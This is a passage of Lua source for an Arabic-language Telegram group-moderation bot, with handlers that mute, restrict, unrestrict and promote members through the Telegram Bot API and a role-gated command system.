if text and text:match("^كتم @(.*)$") and Mod(msg) then
local username = text:match("^كتم @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'*⊀︰ البوت ليس ادمن يرجى ترقيتي*') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⊀︰ لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ⊀︰ عذرا لا تستطيع كتم ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"*⊀︰ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه*")   
return false 
end      
database:sadd(bot_id..'Muted:User'..msg.chat_id_, result.id_)
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم كتمه*'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
end
else
send(msg.chat_id_, msg.id_, '*⊀︰ لا يوجد حساب بهاذا المعرف*')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match('^كتم (%d+) (.*)$') and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
local TextEnd = {string.match(text, "^(كتم) (%d+) (.*)$")}
function start_function(extra, result, success)
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n ⊀︰ عذرا لا تستطيع كتم ( "..Rutba(result.sender_user_id_,msg.chat_id_).." )")
else
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n ⊀︰ تم كتم لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end


if text and text:match('^كتم (%d+) (.*) @(.*)$') and Mod(msg) then
local TextEnd = {string.match(text, "^(كتم) (%d+) (.*) @(.*)$")}
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"*⊀︰ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه*")   
return false 
end      
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n ⊀︰ عذرا لا تستطيع كتم ( "..Rutba(result.id_,msg.chat_id_).." )")
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n ⊀︰ تم كتم لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_..'&until_date='..tonumber(msg.date_+Time))
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, start_function, nil)
return false
end
if text and text:match("^كتم (%d+)$") and Mod(msg) then
local userid = text:match("^كتم (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⊀︰ لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ⊀︰ عذرا لا تستطيع كتم ( '..Rutba(userid,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'*⊀︰ البوت ليس ادمن يرجى ترقيتي*') 
return false  
end
database:sadd(bot_id..'Muted:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم كتمه*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تم كتمه*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
return false
end
if text == ("الغاء كتم") and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Muted:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم الغاء كتمه*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^الغاء كتم @(.*)$") and Mod(msg) then
local username = text:match("^الغاء كتم @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Muted:User'..msg.chat_id_, result.id_)
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم الغاء كتمه*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^الغاء كتم (%d+)$") and Mod(msg) then
local userid = text:match("^الغاء كتم (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Muted:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم الغاء كتمه*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تم الغاء كتمه*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end

if text == ("تقيد") and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⊀︰ لا تسطيع تقيد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n ⊀︰ عذرا لا تستطيع تقيد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم تقيده*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^تقيد @(.*)$") and Mod(msg) then
local username = text:match("^تقيد @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⊀︰ لا تسطيع تقيد البوت ")
return false 
end
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"*⊀︰ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه*")   
return false 
end      
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n ⊀︰ عذرا لا تستطيع تقيد ( '..Rutba(result.id_,msg.chat_id_)..' )')
return false 
end      
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم تقيده*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match('^تقيد (%d+) (.*)$') and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
local TextEnd = {string.match(text, "^(تقيد) (%d+) (.*)$")}
function start_function(extra, result, success)
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n ⊀︰ عذرا لا تستطيع تقيد ( "..Rutba(result.sender_user_id_,msg.chat_id_).." )")
else
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم تقيده لمدة ~* { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end


if text and text:match('^تقيد (%d+) (.*) @(.*)$') and Mod(msg) then
local TextEnd = {string.match(text, "^(تقيد) (%d+) (.*) @(.*)$")}
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"*⊀︰ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه*")   
return false 
end      
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n ⊀︰ عذرا لا تستطيع تقيد ( "..Rutba(result.id_,msg.chat_id_).." )")
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم تقيده لمدة ~* { '..TextEnd[2]..' '..TextEnd[3]..'}'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_..'&until_date='..tonumber(msg.date_+Time))
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^تقيد (%d+)$") and Mod(msg) then
local userid = text:match("^تقيد (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "* ⊀︰ لا تسطيع تقيد البوت *")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n ⊀︰ عذرا لا تستطيع تقيد ( '..Rutba(userid,msg.chat_id_)..' )')
else
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم تقيده*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تم تقيده*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
return false
end
------------------------------------------------------------------------
if text == ("الغاء تقيد") and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم الغاء تقيد*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^الغاء تقيد @(.*)$") and Mod(msg) then
local username = text:match("^الغاء تقيد @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم الغاء تقيد*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^الغاء تقيد (%d+)$") and Mod(msg) then
local userid = text:match("^الغاء تقيد (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم الغاء تقيد*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تم الغاء تقيد*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text and text:match('^ارفع القيود @(.*)') and Manager(msg) then 
local username = text:match('^ارفع القيود @(.*)') 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if Devmode(msg) then
database:srem(bot_id..'GBan:User',result.id_)
database:srem(bot_id..'Ban:User'..msg.chat_id_,result.id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.id_)
database:srem(bot_id..'Gmute:User'..msg.chat_id_,result.id_)
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم الغاء جميع القيود*'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
else
database:srem(bot_id..'Ban:User'..msg.chat_id_,result.id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.id_)
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم الغاء جميع القيود*'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
end
else
Text = '* ⊀︰ المعرف غلط*'
send(msg.chat_id_, msg.id_,Text)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text == "ارفع القيود" and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if Devmode(msg) then
database:srem(bot_id..'GBan:User',result.sender_user_id_)
database:srem(bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم الغاء جميع القيود*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
else
database:srem(bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم الغاء جميع القيود*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match('^كشف القيود @(.*)') and Manager(msg) then 
local username = text:match('^كشف القيود @(.*)') 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if database:sismember(bot_id..'Muted:User'..msg.chat_id_,result.id_) then
Muted = 'مكتوم'
else
Muted = 'غير مكتوم'
end
if database:sismember(bot_id..'Ban:User'..msg.chat_id_,result.id_) then
Ban = 'محظور'
else
Ban = 'غير محظور'
end
if database:sismember(bot_id..'GBan:User',result.id_) then
GBan = 'محظور عام'
else
GBan = 'غير محظور عام'
end
Textt = " ⊀︰ الحظر العام > "..GBan.."\n ⊀︰ الحظر > "..Ban.."\n ⊀︰ الكتم > "..Muted..""
send(msg.chat_id_, msg.id_,Textt)
else
Text = '* ⊀︰ المعرف غلط*'
send(msg.chat_id_, msg.id_,Text)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end

if text == "كشف القيود" and Manager(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if database:sismember(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_) then
Muted = 'مكتوم'
else
Muted = 'غير مكتوم'
end
if database:sismember(bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_) then
Ban = 'محظور'
else
Ban = 'غير محظور'
end
if database:sismember(bot_id..'GBan:User',result.sender_user_id_) then
GBan = 'محظور عام'
else
GBan = 'غير محظور عام'
end
if database:sismember(bot_id..'Gmute:User',result.sender_user_id_) then
Gmute = 'محظور عام'
else
Gmute = 'غير محظور عام'
end
Textt = " ⊀︰ الحظر العام > "..GBan.."\n ⊀︰ الكتم العام > "..Gmute.."\n ⊀︰ الحظر > "..Ban.."\n ⊀︰ الكتم > "..Muted..""
send(msg.chat_id_, msg.id_,Textt)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text == ("ارفع مشرف") and msg.reply_to_message_id_ ~= 0 and BasicConstructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'*⊀︰ البوت ليس ادمن يرجى ترقيتي*') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n ​*⊀︰ الايدي >* `'..result.sender_user_id_..'`\n *⊀︰ تم ارفعه مشرف بكل الصلاحيات*'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^ارفع مشرف @(.*)$") and BasicConstructor(msg) then
local username = text:match("^ارفع مشرف @(.*)$")
